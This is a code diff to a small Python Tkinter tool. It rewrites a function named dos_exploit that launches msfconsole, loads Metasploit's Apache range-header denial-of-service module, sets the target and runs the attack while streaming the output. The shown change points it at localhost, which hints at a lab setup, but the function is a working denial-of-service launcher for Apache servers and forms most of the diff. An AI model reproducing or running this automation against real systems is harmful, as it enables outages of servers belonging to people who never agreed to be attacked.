@@ -19,15 +19,23 @@ def check_reachability():
     else:
         messagebox.showerror("Error", f"Target IP {target_ip} is not reachable. Check your netork connection.")
 
-def dos_exploit(port=80):
-	p = Popen(['msfconsole', ''], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
+def dos_exploit():
+	p = Popen(['msfconsole'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=STDOUT)
 	print("Starting msfconsole...")
-	time.sleep(10) 
-	p.stdin.write(b'use auxillary/dos/http/apache_range_dos')
-	# msf_stdout = 
-	p.stdin.write(f"set RHOST {port}".encode())
-	#print(msf_stdout.decode())
-	p.stdin.write(f"run".encode())
+	time.sleep(20)
+	p.stdin.write(b'use auxiliary/dos/http/apache_range_dos\n')
+	p.stdin.flush()
+	p.stdin.write(b'set RHOST localhost\n')
+	p.stdin.flush()
+	p.stdin.write(b'run\n')
+	p.stdin.flush()
+	while True:
+		line = p.stdout.readline()
+		if b'Auxiliary module execution completed' in line:
+			print(line.rstrip().decode())
+			p.kill()
+			break
+		print(line.rstrip().decode())
 	return
 
 root = tk.Tk()
